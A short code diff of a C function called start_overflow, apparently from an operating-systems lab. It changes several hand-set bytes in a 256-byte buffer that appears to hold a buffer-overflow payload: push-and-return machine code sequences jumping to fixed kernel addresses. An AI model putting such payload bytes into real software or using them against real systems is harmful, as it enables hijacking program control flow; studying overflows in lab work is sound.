@@ -88,7 +88,7 @@ start_overflow(void)
 
     char str[256] ={};
     str[0] = 0x68;
-    str[1] = 0xfc;
+    str[1] = 0x9c;
     str[2] = 0x09;
     str[3] = 0x10;
     str[4] = 0xf0;
@@ -98,8 +98,8 @@ start_overflow(void)
     str[8] = 0x11;
     str[9] = 0xf0;	
     str[10] = 0x68;
-    str[11] = 0x2c;
-    str[12] = 0x09;
+    str[11] = 0xcc;
+    str[12] = 0x08;
     str[13] = 0x10;
     str[14] = 0xf0;
     str[15] = 0xc3;
